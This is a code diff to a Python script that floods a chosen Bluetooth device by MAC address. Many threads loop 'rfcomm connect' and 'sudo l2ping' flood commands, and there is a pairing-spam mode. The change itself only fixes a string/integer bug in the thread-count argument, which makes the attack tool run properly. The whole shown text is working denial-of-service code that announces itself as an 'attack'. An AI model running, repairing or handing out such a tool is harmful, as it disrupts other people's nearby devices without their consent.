@@ -28,14 +28,15 @@ elif (len(sys.argv) != 4):
 else:
     method = sys.argv[1]
     macadd = sys.argv[2]
-    threadnum = int(sys.argv[3])
+    threadnum = str(sys.argv[3])
+    threadnums = int(sys.argv[3])
     if (method == "rfcomm"):
         def loopbacklrfcomm():
             while True: 
                 hwus = run_cmd("rfcomm connect %s 1 2>&1 >/dev/null" % (macadd)) 
                 print("sent packet to " + macadd + " size:700")
         print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
-        for i in range(threadnum):
+        for i in range(threadnums):
             threading.Thread(target = loopbacklrfcomm).start()
     elif (method == "l2ping"):
         def loopbacklping():
@@ -43,7 +44,7 @@ else:
                 hwus = run_cmd("sudo l2ping -i %s -s %s -f %s &" % ("hci0", 600, macadd)) 
                 print("sent packet to " + macadd + " size:700")
         print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
-        for i in range(threadnum):
+        for i in range(threadnums):
             threading.Thread(target = loopbacklping).start()
     elif (method == "pair"):
         def loopback():
@@ -60,4 +61,3 @@ else:
         threading.Thread(target = loopback).start()
     else:
         print("u fucked up the cmd") 
-
